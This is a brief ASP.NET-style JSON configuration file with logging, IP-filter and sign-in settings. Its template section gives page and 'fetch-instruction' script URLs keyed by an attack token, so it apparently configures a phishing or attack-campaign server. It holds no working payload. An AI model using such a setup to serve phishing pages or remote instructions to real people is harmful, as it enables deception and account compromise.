{
  "Logging": {
    "LogLevel": {
      "Default": "Information",
      "Microsoft.AspNetCore": "Warning"
    }
  },
  "Network": {
    "IpFilter": {
      "IsFiltering": true,
      "BlockByDefault": true,
      "LogBlockedRequest": true
    }
  },
  "User": {
    "Account": {
      "RegisterAccountAllowed": false,
      "SignInAllowed": true
    }
  },
  "Template": {
    "PageUrl": "https://lefish.se/page/[[attack_token]]",
    "ScriptUrl": "https://lefish.se/fetch-instruction/[[attack_token]]"
  }
}
